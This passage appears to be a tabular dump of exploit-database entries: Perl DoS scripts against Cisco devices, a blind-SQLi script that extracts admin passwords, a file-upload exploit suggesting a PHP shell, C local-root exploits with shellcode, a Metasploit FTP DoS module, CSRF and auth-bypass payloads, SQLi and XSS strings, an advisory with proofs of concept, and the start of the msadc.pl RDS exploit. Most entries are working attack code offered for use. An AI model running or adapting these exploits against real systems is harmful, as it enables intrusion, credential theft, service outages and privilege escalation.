        PeerPort=>""(2002)"",);                                       unless ($sockd){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   exit(1); }  sub cisco11 # Cisco Catalyst Memory Leak Vulnerability {   my $serv = $host;   my $rep = """";   my $str = ""AAA\n"";    print ""\nInput the number of repetitions : "";   $rep = <STDIN>;   chomp $rep;     my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => ""(23)"",                                      Proto => ""tcp"")                                      || die ""No telnet server detected on $serv ...\n\n"";    for ($k=0; $k<=$rep; $k++) {                                 print $sockd ""$str"";                                 sleep(1);                                 print $sockd ""$str"";                                 sleep(1);                              }   close($sockd);   print ""Packet sent ...\n"";   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);      my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""(23)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print ""Vulnerability unsuccessful exploited. Target server is still up after $rep logins ...\\n"";   close($sockd2);   exit(1); }  sub cisco12 # Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability {   my $serv = $host;   my $l =100;   my $vuln = """";   my $long = ""A"" x $l;    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => ""(80)"",                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    for ($k=0; $k<=50; $k++) {                               my $vuln = ""GET "" . $long . "" HTTP/1.0\n\n"";                               print $sockd ""$vuln\n\n"";                               sleep(1);                               $l = $l + 100;                            }    close($sockd);   print ""Packet sent ...\n"";   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""http(80)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print ""Target is not vulnerable. Server is still up after 5 kb of buffer ...)\n"";   close($sockd2);   exit(1); }  sub cisco13 # %u Encoding IDS Bypass Vulnerability (UTF) {   my $serv = $host;   my $vuln = ""GET %u002F HTTP/1.0\n\n"";    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => ""(80)"",                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   close($sockd);   sleep(1);   print(""Now checking server's status ...\n"");   print(""Please verify if directory has been listed ...\n\n"");   print(""Server response :\n"");   sleep(2);   while (<$sockd>){ print }   exit(1); }  sub cisco14 # Cisco IOS HTTP server DoS Vulnerability {   my $serv = $host;   my $vuln = ""GET /TEST?/ HTTP/1.0"";    my $sockd = IO::Socket::INET->new (                                      Proto=>""tcp"",                                      PeerAddr=>$serv,                                      PeerPort=>""http(80)"",);                                      unless ($sockd){die ""No http server detected on $serv ...\n\n""};    print $sockd ""$vuln\n\n"";   print ""Packet sent ...\n"";   close($sockd);   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""http(80)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   close($sockd2);   exit(1); }",remote,remote,1
37604,"SO Planning 1.32 - Multiple Vulnerabilities SOPlanning - Simple Online Planning Tool multiple vulnerabilities  CVEs: CVE-2014-8673, CVE-2014-8674, CVE-2014-8675, CVE-2014-8676, CVE-2014-8677  Vendor: http://www.soplanning.org/ Product: SOPlanning - Simple Online Planning Version affected: 1.32 and prior  Product description: SO Planning is an open source online planning tool completely free, designed to easily plan projects / tasks online, in order to manage and define work for a whole team. (from http://www.soplanning.org/en/index.php)  Advisory introduction: Soplanning version 1.32 is susceptible to multiple vulnerabilities, including SQLi, XSS, path traversal, authentication information disclosure, PHP code injection.  Credit: Huy-Ngoc DAU of Deloitte Conseil, France  ================================ Finding 1: Soplanning multiple SQL injection vulnerabilities (CVE-2014-8673) ================================ - SQLi in planning.php The project, user, task filters are prone to SQLi due to lack of user input sanitization.  POC : POST /process/planning.php HTTP/1.1 Host: localhost Connection: keep-alive Content-Length: 141 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://localhost/planning.php Accept-Encoding: gzip,deflate,sdch Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4,vi;q=0.2 Cookie: soplanning=[VALID SESSION COOKIE]; inverserUsersProjets=1  filtreGroupeProjet=1&projet_anything=anything') union all select 111,table_name,333,444,555,666,777,888,999 from information_schema.tables#  The query's results can be retrieved by accessing http://localhost/export_csv.php   - order by statement blind SQLi in user_list.php, projets.php, user_groupes.php, groupe_list.php POC: http://localhost/user_list.php?page=1&order=1,1&by= http://localhost/projets.php?order=1,0&by= http://localhost/user_groupes.php?page=1&order=1,(select%20case%20when%20(1=1)%20then%201%20else%201*(select%201%20from%20information_schema.tables)end)=1&by= http://localhost/groupe_list.php?page=1&order=1,(select%20case%20when%20(1=0)%20then%201%20else%201*(select%201%20from%20information_schema.tables)end)=1&by=   - triPlanning GET parameter Blind SQLi in process/planning.php POC: http://localhost/process/planning.php?triPlanning=1,1 and http://localhost/process/planning.php?triPlanning=1,0 (don't follow redirection back to ../planning.php where the sanitization is done)  The differences of TRUE and FALSE can be observed by accessing http://localhost/export_pdf.php?debug=1   - SQLi in LIMIT statement in nb_lignes cookie POC: set the following cookie : nb_lignes=20 into outfile '/tmp/poc_soplanning.txt' and visit http://localhost/process/planning.php  Sample file output content: ADM      \N          admin    admin    df5b909019c9b1659e86e0d6bf8da81d6fa3499e   \N          oui               000000  [""users_manage_all"", ""projects_manage_all"", ""projectgroups_manage_all"", ""tasks_modify_all"", ""tasks_view_all_projects"", ""parameters_all""]  [md5]    non        \N   - insecure use of addslashes function to protect against SQLi Soplanning sanitizes user input to protect against SQLi by using PHP addslashes() function. However, this function is known to be unsafe. Instead, mysql_real_escape_string() should be used.  ================================ Finding 2: Soplanning multiple XSS vulnerabilities (CVE-2014-8674) ================================ - XSS via cookie manipulation in unauthenticated mode (nb_mois, nb_lignes) This vulnerable allows for an attacker having physical access to a user's browser even in unauthenticated mode to steal the user's authenticated cookie.  POC: Disconnect active user session At authentication page, set the following cookie: nb_mois=""><script>alert(document.cookie)</script><"" Login with any valid user account, an alert message will show the cookies.   - Stored XSS in calender export functions Export functions offer a ""debug"" mode which outputs HTML instead of formatted content (pdf, ical). This mode can be activated by setting the ""debug"" GET parameter. However, by injecting malicious HTML code into a project name for example, it is possible to conduct XSS attacks.  POC: Create a new project with the name <script>alert(1);</script> Access http://localhost/export_pdf.php?debug=1  ================================ Finding 3: Soplanning authentication hash disclosure via GET URL in ICAL calender sharing function (CVE-2014-8675) ================================ Soplanning allows for an ICAL calendar to be shared/used elsewhere. However, the link is generated statically using authentication information.  Sample generated link: http://localhost/export_ical.php?login=admin&hash=61b9bab17cdab06e759f2d11ee11afab  An offline brute force attack can thus be conducted to find the user's password: hash = md5($user->login . '¤¤' . $user->password);  ================================ Finding 4: Soplanning path traversal in Holidays calender import function (CVE-2014-8676) ================================ If error messages are activated, the vulnerability allows to detect existence of a remote arbitrary file.  POC: http://localhost/process/feries.php?fichier=../../../../../../../etc/passwd  Sample error output when file does not exist: Warning: file_get_contents(../../holidays/../../etc/passwd) [function.file-get-contents]: failed to open stream: No such file or directory in /[PATH]/includes/class_vcalendar.inc on line 1665  However, it is not possible to retrieve file content or conduct further attack using this vulnerability.  ================================ Finding 5: Soplanning PHP code injection in installation process (CVE-2014-8677) ================================ The installation process is prone to PHP code execution vulnerability.  POC:  - Go to http://localhost/install - Enter valid database credentials and host information. The database name is as follows :  so';phpinfo();// - The next page will show the phpinfo() results  It should be noted that in order for the attack to work, the attacker must prepare his own database server and the database user must either have access to a real database named ""so';phpinfo();//"", or have privileges to create any database.  For installed instances of Soplanning, the attack is also possible (i.e. the installing interface is accessible) if: - PHP version is older than 5.2 - Configured database server is (temporarily or not) down - The directory smarty/templates_c is not writable   ================================  Timeline: 03/08/2014 - Vulnerability discovered 11/08/2014 - Vendor notified 14/08/2014 - Vendor confirmed 09/09/2014 - Patch released  References: Soplanning changelog : http://www.soplanning.org/en/download.php   About Deloitte: Deloitte refers to one or more of Deloitte Touche Tohmatsu Limited, a UK private company limited by guarantee, and its network of member firms, each of which is a legally separate and independent entity. Please see www.deloitte.com/about for a detailed description of the legal structure of Deloitte Touche Tohmatsu Limited and its member firms. In France, Deloitte SAS is the member firm of Deloitte Touche Tohmatsu Limited, and professional services are provided by its subsidiaries and affiliates. Our Enterprise Risk Services practice is made up of over 11,000 professionals providing services relating to security, privacy & resilience; data governance and analytics; information and controls assurance; risk management technologies; and technology risk & governance. We help organizations build value by taking a ""Risk Intelligent"" approach to managing financial, technology, and business risks.  Huy-Ngoc DAU Senior Consultant | IT Advisory Deloitte Conseil 185, avenue Charles de Gaulle, Neuilly-sur-Seine, 92200, France Mobile: +33 (0)6 70 97 91 95  Tel: +33 (0)1 58 37 03 72 hdau@deloitte.fr<mailto:hdau@deloitte.fr> | www.deloitte.fr<www.deloitte.com>  Avant d'imprimer, pensez à l'environnement",remote,webapps,1
7165,"wPortfolio 0.3 - Arbitrary File Upload #!/usr/bin/perl  # Name: wPortfolio <= 0.3 Arbitrary File Upload Exploit # Script Name: wPortfolio 0.3 # Download: http://sourceforge.net/project/downloading.php?group_id=244834&use_mirror=kent&filename=wPortfolio.zip&80791070 # Vulnerability: Arbitrary File Upload # Vulnerable page: /admin/upload_form.php # * You can upload everything you want, why not a php shell? ^^ # Author: Osirys # Contact: osirys[at]live[dot]it # Proud to be Italian  # Thx: athos  use LWP::UserAgent; use HTTP::Request::Common;  my $path        = ""/admin/upload_form.php""; my $d_fold      = ""/admin/tmp/"";  my($host,$file) = ($ARGV[0],$ARGV[1]);  ($host,$file) || help(""-1""); cheek($host) == 1 || help(""-2""); &banner; my $url = $host.$path;  my $ua = LWP::UserAgent->new; my $re = $ua->request(POST $url,                       Content_Type => 'form-data',                       Content      => [file_to_upload => [$file]]                        );  if ($re->is_success) {     print ""[+] Uploaded ! \n"";     print ""[+] Link: "".$host.$d_fold.$file."" \n""; } else {     print ""[-] Upload failed ! \n""; }  sub cheek() {     my $host = $_[0];     if ($host =~ /http:\/\/(.*)/) {         return 1;     }     else {         return 0;     } }  sub banner {     print ""\n"".           ""  ========================================== \n"".           ""     wPortfolio 0.3 Arbitrary File Upload \n"".           ""     Author: Osirys \n"".           ""     osirys[at]live[dot]it \n"".           ""     Proud to be italian \n"".           ""  ========================================== \n\n""; }  sub help() {     my $error = $_[0];     if ($error == -1) {         &banner;         print ""\n[-] Cheek that you typed the hostname address and the local file to upload !\n"";     }     elsif ($error == -2) {         &banner;         print ""\n[-] Bad hostname address !\n"";     }     print ""[*] Usage : perl $0 http://hostname/cms_path local_file_to_upload \n\n"";     exit(0); }  # milw0rm.com [2008-11-19]",local,webapps,0
5806,"GLLCTS2 - 'sort' Blind SQL Injection #!/usr/bin/perl ###################### # #gllcTS2 (listing.php $sort) Remote Blind SQL Injection Exploit # ###################### # #Bug by: h0yt3r # ## ### ## # #This one shows another vulnerability in the gllcTS2. (Thera are many with simple injections) #Same Versions are affected. #Also shows the conecpt of how to inject an ORDER BY statement via Blind Injection and #WITHOUT benchmark(), means we produce an error if the IF statement returns TRUE. # #Gr33tz go to: #b!zZ!t, ramon, thund3r, Free-Hack, Sys-Flaw and of course the neverdying h4ck-y0u Team # ################ use LWP::UserAgent; my $userAgent = LWP::UserAgent->new;  usage();  $server = $ARGV[0]; $dir = $ARGV[1];   print""\n""; if (!$dir) { die ""Read Usage!\n""; }   $filename =""listing.php"";  my $vulnCheck = ""http://"".$server.$dir.$filename;  my $prefix ="""";  my @Daten = (""61"",""62"",""63"",""64"",""65"",""66"",""67"",""68"",""69"",""6A"",""6B"",""6C"",""6D"",""6E"",""6F"",""70"",""71"",""72"",""73"",""74"",""75"",""76"",""77"",""78"",""79"",""7A"",""3A"",""5F"",""31"",""32"",""33"",""34"",""35"",""36"",""37"",""38"",""39"",""30"");  my $Attack= $userAgent->get($vulnCheck); if ($Attack->is_success) {     print ""[x]Attacking "".$vulnCheck.""\n""; } else {     print ""Couldn't connect to "".$vulnCheck.""!"";     exit; }  print ""[x]Vulnerable Check:"";  my $check = $vulnCheck.""?sort='"";  my $Attack= $userAgent->get($check); if($Attack->content =~ m/FROM (.*?)_weblist/i) {     print "" Vulnerable!\n"";         $prefix = $1; } else {     print "" Not Vulnerable!"";     exit; }  my $hex=""""; my $length;  print ""[x]Bruteforcing Length\n"";  my $lengthCounter = 1; while(1) {     #To inject ORDER BY (where we cannot union select) we just have to pass a simple IF statement.     #Instead of Benchmark() we can use a subquery which, in this case, would return ""Subquery returns more than 1 row"" if the statement actualle is true.     my $url = """".$vulnCheck.""?sort=IF(LENGTH((select admin_pass from "".$prefix.""_admin))="".$lengthCounter."",(select 1 union select 5),null)&direction=desc&showgroup=all"";     my $Attack= $userAgent->get($url);     my $content = $Attack->content;     if($content =~ m/Please contact a the site admin immediately./i)     {                 $length=$lengthCounter;                 last;             }     else     {         $lengthCounter++;         } }   print ""[x]Injecting Black Magic\n"";  for($b=1;$b<=$length;$b++) {     for(my $u=0;$u<28;$u++)     {                                                                     my $url = """".$vulnCheck.""?sort=IF(substring((select admin_pass from "".$prefix.""_admin),"".$b."",1)=0x"".$Daten[$u]."",(select 1 union select 5),null)&direction=desc&showgroup=all"";          my $Attack= $userAgent->get($url);          my $content = $Attack->content;                          if($content =~ m/Please contact a the site admin immediately./i)            {                         print ""[x]    Found Char "".$Daten[$u].""\n"";                         $hex=$hex.$Daten[$u];             last;         }          else         {             #Whatever...                     }     } }  print ""[x]Converting \n""; my $a_str = hex_to_ascii($hex);  print ""[x]Success! \n""; print ""     Adminpassword: $a_str\n"";      sub hex_to_ascii ($) {                 (my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;         return $str; }  sub usage() {     print q     {     ######################################################               gllcTS2 Remote Blind SQL Injection Exploit                                      -Written  by h0yt3r-                            Usage: gllcts2.pl [Server] [Path]     Sample:     perl gllcts2.pl www.site.com /cms/     ######################################################     };  }   # milw0rm.com [2008-06-13]",remote,webapps,1
9515,"Cerberus FTP 3.0.1 - 'ALLO' Remote Overflow Denial of Service (Metasploit) #####################################################################################  Application:  Cerberus FTP 3.0.1              Platforms:    Windows XP Professional SP2  crash:	      N/A 	 Exploitation: remote DoS  Date:         2009-08-24  Author:       Francis Provencher (Protek Research Lab's)                #####################################################################################  1) Introduction 2) Technical details 3) The Code   #####################################################################################  =============== 1) Introduction  =============== Cerberus FTP Server is a secure and easy-to-use professional Windows FTP server featuring FIPS 140-2 certified encryption.  #####################################################################################  ============================ 2) Technical details  ============================  The validation of some ftp commands are not made by the server. This lead to a a DoS....     #####################################################################################  =========== 3) The Code ===========  Proof of concept DoS code;  require 'msf/core'  class Metasploit3 < Msf::Auxiliary  	include Msf::Exploit::Remote::Ftp 	include Msf::Auxiliary::Dos 	 	def initialize(info = {}) 		super(update_info(info,	 			'Name'           => 'Cerberus FTP command ALLO overflow', 			'Description'    => %q{ 				 You need to have a valid login 				so you can run ALLO command. 			}, 			'Author'         => 'Francis Provencher ""Protek Research Lab's"", 			'License'        => MSF_LICENSE, 			'Version'        => '1', 			'References'     => 				 			'DisclosureDate' => 'Aug 24 2009'))  		# They're required 		register_options([ 			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]), 			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ]) 		]) 	end  	def run 		return unless connect_login  		print_status(""Sending commands..."")  		# We want to try to wait for responses to these 		raw_send(""ALLO #{'A' * 20000}\r\n"") 		raw_send(""ALLO #{'A' * 20000}\r\n"")  		disconnect 	end end   #####################################################################################  # milw0rm.com [2009-08-25]",remote,dos,1
15813,"IPN Development Handler 2.0 - Multiple Vulnerabilities IPN Development Handler v2.0 CSRF (Change Admin Account) ==============================================================  #################################################################### .:. Author         : AtT4CKxT3rR0r1ST  [F.Hack@w.cn] .:. Script         : http://scripts.filehungry.com/product/php/e-commerce/paypal/ipn_development_handler/  ####################################################################   ===[ Exploit ]===  <form method=""POST"" name=""form0"" action=""http://localhost/siteadmin/EditInfo.php""> <input type=""hidden"" name=""username"" value=""admin""/> <input type=""hidden"" name=""password"" value=""123456""/> <input type=""hidden"" name=""password2"" value=""123456""/> <input type=""hidden"" name=""s1"" value=""Update""/> </form>  </body> </html>  ####################################################################  IPN Development Handler v2.0 Auth Bypass ==============================================================  #################################################################### .:. Author : AtT4CKxT3rR0r1ST [F.Hack@w.cn] .:. Script : http://scripts.filehungry.com/product/php/e-commerce/paypal/ipn_development_handler/  ####################################################################  ===[ Vulnerability ]=== Source Code path/siteadmin/login.php  if(isset($_POST[s2])) { $MyUsername1 = strip_tags($_POST[username1]); $MyPassword1 = strip_tags($_POST[password1]);  if(empty($MyUsername1) || empty($MyPassword1)) { $MyError = ""<center><font color=red size=2 face=verdana><b>All fields are required!</b></font></center>""; } else { //check the login info if exists $q1 = ""select * from dd_admin where username = '$MyUsername1' and password = '$MyPassword1' "";  $r1 = mysql_query($q1);  if(!$r1) { echo mysql_error(); exit();  ===[ Exploit ]===  1- Go to Siteadmin [www.site.com/siteadmin/login.php] 2- join code Auth Bypass in Username & Password 3- Username: 'or'a'='a Password: 'or'a'='a   ####################################################################",remote,webapps,1
32469,"Proxim Tsunami MP.11 2411 Wireless Access Point - 'system.sysName.0' SNMP HTML Injection source: https://www.securityfocus.com/bid/31666/info  The Proxim Tsunami MP.11 2411 Wireless Access Point is prone to an HTML-injection vulnerability because it fails to sufficiently sanitize user-supplied input data.  Attacker-supplied HTML and script code would run in the context of the web interface of the affected device, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.  This issue is reported in the Tsunami MP.11 Model 2411; additional products may also be vulnerable.  $ snmpset -v1 -c public 192.168.1.100 sysName.0 s&#039;""><script>alert(1)</script>&#039;",remote,remote,1
1445,"Eterm LibAST < 0.7 - '-X' Option Privilege Escalation // eterm by default isn't setuid but there is a lot of instances where  // it needs setuid root/utmp to run different options. /str0ke  /***************************************************************************  *   Copyright  ©Rosiello Security 2006                                    *  *                                                                         *  *   URL: http://www.rosiello.org                                          *  *   Author: Johnny Mast                                                   *  *   e-mail: rave@rosiello.org                                             *  *                                                                         *  *   This program is free software; you can redistribute it and/or modify  *  *   it under the terms of the GNU General Public License as published by  *  *   the Free Software Foundation; either version 2 of the License, or     *  *   (at your option) any later version.                                   *  *                                                                         *  *   This program is distributed in the hope that it will be useful,       *  *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *  *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *  *   GNU General Public License for more details.                          *  *                                                                         *  *   You should have received a copy of the GNU General Public License     *  *   along with this program; if not, write to the                         *  *   Free Software Foundation, Inc.,                                       *  *   59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.             *  ***************************************************************************/   //Exploit for Ubuntu with no randomized stack  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h>  char shellcode[] = /* Set gid */  ""\x90\x90\x90\x90\x90\x90\x90"" ""\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1\x2b\x31\xc0\xb0\x47\xcd\x80"" ""\x31\xdb\x31\xc9\xb3\x2b\xb1\x2b\x31\xc0\xb0\x47\xcd\x80""  /* execve() */ ""\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"" ""\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"" ""\x80\xe8\xdc\xff\xff\xff/bin/sh"";   unsigned long ret = 0xd096edb7; unsigned long shell = 0xbfffebfd;    int main(void) {  char *first, *last, *ptr;  char  a[4], b[4];  int slen = strlen(shellcode);   if (!(first = (char *)malloc(4165)))   {    printf(""%s:%d Could not allocate required memory\n"", __FILE__, __LINE__);    exit(-1);   }    if (!(last = (char *)malloc(16)))   {    printf(""%s:%d Could not allocate required memory\n"", __FILE__, __LINE__);    exit(-1);   }    if (!(ptr = (char *)malloc(4183)))   {    printf(""%s:%d Could not allocate required memory\n"", __FILE__, __LINE__);    exit(-1);   }    strcpy(first, shellcode);   memset(first+slen, 'A', 4162-slen);   memset(last,  'A', 12);   first[4162] = '\0';   last[12] = '\0';    a[0] = (ret >> 24) & 0xff;   a[1] = (ret >> 16) & 0xff;   a[2] = (ret >> 8) & 0xff;   a[3] = (ret) & 0xff;     b[0] = (shell >> 24) & 0xff;   b[1] = (shell >> 16) & 0xff;   b[2] = (shell >> 8) & 0xff;   b[3] = (shell) & 0xff;    sprintf(ptr, ""%s%c%c%c%c%s%c%c%c%c"", first,a[0],a[1], a[2], a[3], last,   b[3],b[2],b[1],b[0]);      execl(""/usr/bin/Eterm"", ""eterm"", ""-X"", ptr, NULL);  return 0; }  // milw0rm.com [2006-01-24]",local,local,1
3840,Pre Classifieds Listings 1.0 - SQL Injection ==============================================  Pre Classifieds Listings v1.0 Remote SQL Injection  ==============================================  Found: Cyber-Security.org  ==============================================  Exploit: search.php?category=-1/**/union/**/select/**/pass/**/from/**/users/* search.php?category=-1/**/union/**/select/**/name/**/from/**/users/*  ==============================================  Example: http://preproject.com/phppcl/  ==============================================  # milw0rm.com [2007-05-03],remote,webapps,1
602,"SCO OpenServer 5.0.7 - MMDF deliver Privilege Escalation /*  *  MMDF deliver local root exploit for SCO OpenServer 5.0.7 x86  *  Copyright 2004 Ramon de Carvalho Valle  *  */  char shellcode[]=           /*  36 bytes                          */     ""\x68\xff\xf8\xff\x3c""  /*  pushl   $0x3cfff8ff               */     ""\x6a\x65""              /*  pushl   $0x65                     */     ""\x89\xe6""              /*  movl    %esp,%esi                 */     ""\xf7\x56\x04""          /*  notl    0x04(%esi)                */     ""\xf6\x16""              /*  notb    (%esi)                    */     ""\x31\xc0""              /*  xorl    %eax,%eax                 */     ""\x50""                  /*  pushl   %eax                      */     ""\x68""""/ksh""            /*  pushl   $0x68736b2f               */     ""\x68""""/bin""            /*  pushl   $0x6e69622f               */     ""\x89\xe3""              /*  movl    %esp,%ebx                 */     ""\x50""                  /*  pushl   %eax                      */     ""\x50""                  /*  pushl   %eax                      */     ""\x53""                  /*  pushl   %ebx                      */     ""\xb0\x3b""              /*  movb    $0x3b,%al                 */     ""\xff\xd6""              /*  call    *%esi                     */ ;  main(int argc,char **argv) {     char buffer[16384],address[4],*p;     int i;      printf(""MMDF deliver local root exploit for SCO OpenServer 5.0.7 x86\n"");     printf(""Copyright 2004 Ramon de Carvalho Valle\n\n"");      *((unsigned long *)address)=(unsigned long)buffer-256+5120+4097;      sprintf(buffer,""-c"");     p=buffer+2;     for(i=0;i<5120;i++) *p++=address[i%4];     for(i=0;i<8192;i++) *p++=0x90;     for(i=0;i<strlen(shellcode);i++) *p++=shellcode[i];     *p=0;      execl(""/usr/mmdf/bin/deliver"",""deliver"",buffer,0); }    // milw0rm.com [2004-10-26]",local,local,1
17570,"MusicBox 3.7 - Multiple Vulnerabilities ============================================================ MusicBox <= v3.7 Multiple Vulnerabilities ============================================================   [~] Author : R@1D3N (amin emami)  [~] Software Link : www.musicboxv2.com  [~] Price : $275  [~] Version : v3.7 and previous versions  [~] Contact : aminrayden@yahoo.com <~  [~] DorK : inurl:genre_artists.php  [~] Forum : http://ashiyane.org/forums/  [~] Greetz :ItSecTeam, Inj3ct0r, Exploit-db  [~] Tested on: Windows XP Sp3  vul1.sql injection:  /[Path]/index.php?action=top&type=Songs&show=10'[ SQL ATTACK]  Vul2.Cross site Scripting:  /[path]/index.php?in=song&term=""><script>alert(document.cookie)<%2Fscript>&action=search&start=0",remote,webapps,1
19424,"Microsoft Data Access Components (MDAC) 2.1 / Microsoft IIS 3.0/4.0 / Microsoft Index Server 2.0 / Microsoft Site Server Commerce Edition 3.0 i386 MDAC - RDS (1) source: https://www.securityfocus.com/bid/529/info  MDAC (Microsoft Data Access Components) is a package used to integrate web and database services. It includes a component named RDS (Remote Data Services). RDS allows remote access via the internet to database objects through IIS. Both are included in a default installation of the Windows NT 4.0 Option Pack, but can be excluded via a custom installation.  RDS includes a component called the DataFactory object, which has a vulnerability that could allow any web user to: --Obtain unauthorized access to unpublished files on the IIS server --Use MDAC to tunnel ODBC requests through to a remote internal or external location, thereby obtaining access to non-public servers or effectively masking the source of an attack on another network.  The main risk in this vulnerability is the following: --If the Microsoft JET OLE DB Provider or Microsoft DataShape Provider are installed, a user could use the shell() VBA command on the server with System privileges. (See the Microsoft JET Database Engine VBA Vulnerability for more information). These two vulnerabilities combined can allow an attacker on the Internet to run arbitrary commands with System level privileges on the target host.    msadc.pl exploit written and posted to bugtraq by Rain Forest Puppy.   --msadc.pl explanation:  msadc.pl looks for a common file to exploit, namely btcustmr.mdb . msadc.pl instructions: run perl -x msadc.pl Command line switches (copied from rfp's post):  -h <ip or domain> this is the host to scan. You MUST either use either -h or -R.  -d <value 0-?> this is the delay between connections. Value is in number of seconds. I added this because hammering the RDS components caused the server to occasionally stop responding :) Defaults to 1. Use -d 0 to disable.  -V Use VbBusObj instead of DataFactory to run the queries. NOTE: please read the -N information below as to suggestions for checking if VbBusObj exists. VbBusObj does not give good error reporting; therefore it is quite possible to have false positives (and false negatives). Consider VbBusObj support 3 stages before beta. Don't say I didn't warn you.  -v verbose. This will print the ODBC error information. Really only for troubleshooting purposes.  -e external dictionary file to use on step 5--the 'DSN dictionary guess' stage. The file should just be plaintext, one DSN name per line file with all the DSN names you want to try. Quite honestly a normal dictionary file won't do you much good. You can probably do pretty damn well with a few dozen or two good ones, like 'www', 'data', 'database', 'sql', etc.  -R resume. You can still specify -v or -d with -R. This will cause the script to read in rds.save and execute the command on the last valid connection.  -N Use VbBusObj to try to get the machine's NetBIOS name. It may return no name if the VbBusObj is unavailable. I suggest you use -N to see if VbBusObj exists (a NetBIOS name will be returned if so) before you use -V.  -X perform an Index Server table dump instead. None of the other switches really apply here, other than -v (although -d still works, there's no need to slow down one query). This dumps the root paths from Index Server, which can be rather lengthy. I suggest you pipe the output into a file. Also, if there is a lot of return information, this command may take a while to complete. Be patient. And I don't suggest you use this command more than once a minute...it caused my P200 w/ 128 RAM to stop answering requests, and in general borked inetinfo.exe. If you do decide to CONTROL-C during the middle of the data download the script will save all received data into a file called 'raw.out', so you don't loose everything you've already received. NOTE: this is the raw data, which is in Unicode.  rfp submitted a version 2 of this exploit on October 10, 1999. New features include:  - UNC support. This has only been tested with Windows 95 shares...NT may cause authentication wackiness. Use -u \\server\share\file.mdb. Also, on unix boxen, don't forget you have to escape the '\', so would look like \\\\server\\share\\file.mdb. Also have not tested with Samba. Let me know if you have good/bad results.  - Win 95 support. Use -w to use command /c instead of cmd /c.  - Slimmed down the query process. Before it would query to determine if it was using Access driver, then create a table called 'AZZ', and then try to use this 'AZZ' table for the exploit. This left obvious leftovers (tables named 'AZZ') on the server. Now it just queries MSysModules firsthand, which cuts down the steps and stops leaving evidence. However, this may not always work. Use the -c switch for backwards compatibility (3 step process). I would run normal, and if nothing works, try it again with the -c switch.  - Only run a certain step. Use the -s switch to specify which step to run. For those of you itching to try the new UNC support, you can run it immediately (normally it's step 5), by running:  ./msadc.pl -h <host> -u <unc path> -s 5    NOTE ON SUCCESS: The script reports 'Success!' when it has issued a valid SQL statement. 'Success!' does *NOT* mean that your command worked. If they have MDAC 2.1+ shell commands are worthless, so the script will report 'Success!' (it went through) but your command didn't run (MDAC 2.1 didn't interpret it). There's no return indication to know whether your command worked or not. As with the ODBC commands, you're flying blind.    #!/usr/bin/perl # # MSADC/RDS 'usage' (aka exploit) script version 2 # #       by rain forest puppy # #       - added UNC support, really didn't clean up code, but oh well  use Socket; use Getopt::Std; getopts(""e:vd:h:XRVNwcu:s:"", \%args);  print ""-- RDS smack v2 - rain forest puppy / ADM / wiretrip --\n"";  if (!defined $args{h} && !defined $args{R}) { print qq~ Usage: msadc.pl -h <host> { -d <delay> -X -v }         -h <host>               = host you want to scan (ip or domain)         -d <seconds>            = delay between calls, default 1 second         -X                      = dump Index Server path table, if available         -N                      = query VbBusObj for NetBIOS name         -V                      = use VbBusObj instead of ActiveDataFactory         -v                      = verbose         -e                      = external dictionary file for step 5         -u <\\\\host\\share\\file>      = use UNC file         -w                      = Windows 95 instead of Windows NT         -c                      = v1 compatibility (three step query)         -s <number>             = run only step <number>          Or a -R will resume a (v2) command session  ~; exit;}  ########################################################### # config data  @drives=(""c"",""d"",""e"",""f"",""g"",""h"");  @sysdirs=(""winnt"",""winnt35"",""winnt351"",""win"",""windows"");  # we want 'wicca' first, because if step 2 made the DSN, it's ready to go @dsns=(""wicca"", ""AdvWorks"", ""pubs"", ""CertSvr"", ""CFApplications"",         ""cfexamples"", ""CFForums"", ""CFRealm"", ""cfsnippets"", ""UAM"",         ""banner"", ""banners"", ""ads"", ""ADCDemo"", ""ADCTest"");  # this is sparse, because I don't know of many @sysmdbs=(      ""\\catroot\\icatalog.mdb"",                 ""\\help\\iishelp\\iis\\htm\\tutorial\\eecustmr.mdb"",                 ""\\system32\\help\\iishelp\\iis\\htm\\tutorial\\eecustmr.mdb"",                 ""\\system32\\certmdb.mdb"",                 